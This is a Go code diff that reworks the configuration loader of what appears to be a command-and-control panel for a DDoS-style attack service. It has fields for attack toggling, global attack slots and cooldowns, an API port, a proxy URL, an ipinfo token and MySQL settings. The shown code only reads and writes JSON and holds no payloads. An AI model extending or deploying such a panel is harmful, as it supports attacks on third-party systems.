@@ -6,59 +6,97 @@ import (
 	"os"
 )
 
+// Config holds all runtime configuration loaded from config.json
 type Config struct {
-	License         string `json:"-"`
+	// CNC settings
 	Port            string `json:"-"`
 	Funnel_port     string `json:"-"`
 	Attacks_enabled bool   `json:"-"`
 	Global_cooldown int    `json:"-"`
 	Global_slots    int    `json:"-"`
-	DBUser          string `json:"-"`
-	DBPass          string `json:"-"`
-	DBHost          string `json:"-"`
-	DBName          string `json:"-"`
+
+	// External services
+	IpinfoToken string `json:"-"`
+	ProxyURL    string `json:"-"`
+
+	// Password policy
+	PasswordMinLength int `json:"-"`
+
+	// Timezone for expiry display
+	Timezone string `json:"-"`
+
+	// MySQL settings
+	DBUser         string `json:"-"`
+	DBPass         string `json:"-"`
+	DBHost         string `json:"-"`
+	DBName         string `json:"-"`
+	DBMaxConns     int    `json:"-"`
+	DBConnLifetime int    `json:"-"` // minutes
 }
 
+// AuxConfig maps the JSON structure to flat Config fields
 type AuxConfig struct {
 	CNC struct {
-		License         string `json:"license"`
 		Port            string `json:"port"`
 		Funnel_port     string `json:"api_port"`
 		Attacks_enabled bool   `json:"attacks_enabled"`
 		Global_cooldown int    `json:"global_cooldown"`
 		Global_slots    int    `json:"global_slots"`
+		IpinfoToken     string `json:"ipinfo_token"`
+		ProxyURL        string `json:"proxy_url"`
+		PasswordMinLen  int    `json:"password_min_length"`
+		Timezone        string `json:"timezone"`
 	} `json:"cnc"`
 	MySQL struct {
-		DBUser string `json:"db_user"`
-		DBPass string `json:"db_pass"`
-		DBHost string `json:"db_host"`
-		DBName string `json:"db_name"`
+		DBUser         string `json:"db_user"`
+		DBPass         string `json:"db_pass"`
+		DBHost         string `json:"db_host"`
+		DBName         string `json:"db_name"`
+		DBMaxConns     int    `json:"max_connections"`
+		DBConnLifetime int    `json:"conn_lifetime_minutes"`
 	} `json:"mysql"`
 }
 
-// UnmarshalJSON has been kept as is
 func (c *Config) UnmarshalJSON(data []byte) error {
 	aux := AuxConfig{}
 	if err := json.Unmarshal(data, &aux); err != nil {
 		return err
 	}
 
-	// Mapping data from aux to our Config
-	c.License = aux.CNC.License
 	c.Port = aux.CNC.Port
 	c.Funnel_port = aux.CNC.Funnel_port
 	c.Attacks_enabled = aux.CNC.Attacks_enabled
 	c.Global_cooldown = aux.CNC.Global_cooldown
 	c.Global_slots = aux.CNC.Global_slots
+	c.IpinfoToken = aux.CNC.IpinfoToken
+	c.ProxyURL = aux.CNC.ProxyURL
+	c.PasswordMinLength = aux.CNC.PasswordMinLen
+	c.Timezone = aux.CNC.Timezone
 	c.DBUser = aux.MySQL.DBUser
 	c.DBPass = aux.MySQL.DBPass
 	c.DBHost = aux.MySQL.DBHost
 	c.DBName = aux.MySQL.DBName
+	c.DBMaxConns = aux.MySQL.DBMaxConns
+	c.DBConnLifetime = aux.MySQL.DBConnLifetime
+
+	// Defaults
+	if c.Timezone == "" {
+		c.Timezone = "UTC"
+	}
+	if c.PasswordMinLength == 0 {
+		c.PasswordMinLength = 6
+	}
+	if c.DBMaxConns == 0 {
+		c.DBMaxConns = 25
+	}
+	if c.DBConnLifetime == 0 {
+		c.DBConnLifetime = 5
+	}
 
 	return nil
 }
 
-// / LoadConfig loads the config from the JSON file
+// LoadConfig reads and parses the config JSON file
 func LoadConfig(filePath string) (*Config, error) {
 	file, err := os.Open(filePath)
 	if err != nil {
@@ -74,35 +112,28 @@ func LoadConfig(filePath string) (*Config, error) {
 	return &config, nil
 }
 
-// ToggleAttacks toggles the attacks_enabled flag
+// ToggleAttacks flips the attacks_enabled flag and saves
 func (c *Config) ToggleAttacks() error {
-	// Toggle the Attacks_enabled flag
 	c.Attacks_enabled = !c.Attacks_enabled
-
-	// Save only the changes to config file
 	return c.SaveConfig("assets/config.json")
 }
 
-// SaveConfig saves only the modified config to the JSON file
+// SaveConfig writes the current config back to disk preserving JSON structure
 func (c *Config) SaveConfig(filePath string) error {
-	// Open the config file for reading and writing
 	file, err := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE, 0644)
 	if err != nil {
 		return fmt.Errorf("error opening config file for writing: %v", err)
 	}
 	defer file.Close()
 
-	// Load the full configuration to preserve data
 	var auxConfig AuxConfig
 	decoder := json.NewDecoder(file)
 	if err := decoder.Decode(&auxConfig); err != nil {
 		return fmt.Errorf("error decoding config: %v", err)
 	}
 
-	// Update the attack_enabled flag in the config data
 	auxConfig.CNC.Attacks_enabled = c.Attacks_enabled
 
-	// Re-open the file for writing (truncate the file content)
 	file.Close()
 	file, err = os.OpenFile(filePath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644)
 	if err != nil {
@@ -110,11 +141,9 @@ func (c *Config) SaveConfig(filePath string) error {
 	}
 	defer file.Close()
 
-	// Create a JSON encoder to write the struct back to the file
 	encoder := json.NewEncoder(file)
-	encoder.SetIndent("", "  ") // Pretty print
+	encoder.SetIndent("", "  ")
 
-	// Write the updated config data back to the file
 	if err := encoder.Encode(auxConfig); err != nil {
 		return fmt.Errorf("error saving config file: %v", err)
 	}
